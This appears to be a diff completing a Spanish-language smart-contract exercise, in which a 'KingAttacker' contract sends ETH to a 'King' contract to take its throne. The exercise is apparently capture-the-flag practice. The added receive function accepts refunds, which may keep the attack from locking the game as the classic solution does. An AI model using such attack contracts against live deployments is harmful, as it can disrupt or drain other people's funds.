@@ -6,10 +6,15 @@ import "@openzeppelin/contracts/utils/Address.sol";
 
 contract KingAttacker is Ownable {
 
+    using Address for address payable;
+
     function attack(address payable kingContractAddress) external payable onlyOwner {
         // COMPLETAR
         // ¿Qué función del contrato King tenemos que llamar?
         // ¿Hay que enviar ETH? ¿Cuánto?
         // ¿Qué función conviene usar en este caso para enviar ETH? ¿Qué librería usamos?
+        kingContractAddress.sendValue(msg.value);
     }
+
+    receive() external payable {}
 }
